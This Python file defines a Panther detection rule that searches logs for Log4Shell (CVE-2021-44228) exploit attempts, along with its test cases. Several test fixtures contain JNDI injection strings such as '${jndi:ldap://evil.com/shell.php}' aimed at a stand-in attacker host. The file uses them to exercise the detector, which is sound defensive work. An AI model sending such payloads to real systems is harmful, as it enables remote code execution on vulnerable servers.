from typing import List

from panther_analysis.base import PantherRule, PantherRuleTest, Severity
from panther_analysis.helpers.panther_iocs import LOG4J_EXPLOIT_IOCS

ioc_log4j_exploit_tests: List[PantherRuleTest] = [
    PantherRuleTest(
        Name="Exploit Detected in Event (String)",
        ExpectedResult=True,
        Log={
            "src_addr": "10.10.10.123",
            "dst_addr": "10.10.10.124",
            "payload": "${jndi:ldap://evil.com/shell.php}",
            "p_log_type": "AWS.ALB",
        },
    ),
    PantherRuleTest(
        Name="Exploit Detected in Event (Case)",
        ExpectedResult=True,
        Log={
            "src_addr": "10.10.10.123",
            "dst_addr": "10.10.10.124",
            "payload": "${jNdI:LdaP://evil.com/shell.php}",
            "p_log_type": "AWS.ALB",
        },
    ),
    PantherRuleTest(
        Name="Exploit Detected in Event (List)",
        ExpectedResult=True,
        Log={
            "src_addr": "10.10.10.123",
            "dst_addr": "10.10.10.124",
            "payload": "['${jndi:nis://evil.com/shell.php}', 'foobar']",
            "p_log_type": "AWS.ALB",
        },
    ),
    PantherRuleTest(
        Name="Exploit Detected in Event (Dict)",
        ExpectedResult=True,
        Log={
            "src_addr": "10.10.10.123",
            "dst_addr": "10.10.10.124",
            "payload": [
                7,
                "nothing to declare",
                {"foo": "${jndi:ldap://evil.com/shell.php}", "bar": "baz"},
            ],
            "p_log_type": "AWS.ALB",
        },
    ),
    PantherRuleTest(
        Name="No Exploit found",
        ExpectedResult=False,
        Log={
            "src_addr": "10.10.10.123",
            "dst_addr": "10.10.10.124",
            "payload": "Nothing to see here",
        },
    ),
]


class IOCLog4jExploit(PantherRule):
    RuleID = "IOC.Log4jExploit-prototype"
    DisplayName = "Log4J Exploit IOC Search"
    Enabled = True
    LogTypes = [
        "AWS.ALB",
        "AWS.CloudTrail",
        "AWS.S3ServerAccess",
        "Apache.AccessCombined",
        "Apache.AccessCommon",
        "Cloudflare.Firewall",
        "Cloudflare.HttpRequest",
        "Fastly.Access",
        "GCP.AuditLog",
        "Juniper.Access",
        "Juniper.Firewall",
        "Nginx.Access",
        "Syslog.RFC3164",
        "Syslog.RFC5424",
    ]
    Tags = [
        "AWS",
        "GCP",
        "Web",
        "Log4J",
        "Execution:Exploitation for Client Execution",
        "Deprecated",
    ]
    Reports = {"MITRE ATT&CK": ["TA0002:T1203"]}
    Severity = Severity.Info
    Description = "Monitors for potential exploit attempts agains CVE-2021-44228, Log4J remote code execution\n"
    Reference = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\n"
    Runbook = "Investigate exploit attempt event content to determine scope and type of exploitation. Patch Log4J to the latest patched version\n"
    SummaryAttributes = ["p_any_domain_names", "p_any_ip_addresses", "p_log_type", "p_source_label"]
    Tests = ioc_log4j_exploit_tests

    def rule(self, event):
        event_string = str(event).lower()
        for exploit in LOG4J_EXPLOIT_IOCS:
            if exploit.lower() in event_string:
                return True
        return False

    def title(self, event):
        return f"Log4J exploit attempt detected in log source {event.get('p_log_type')}"
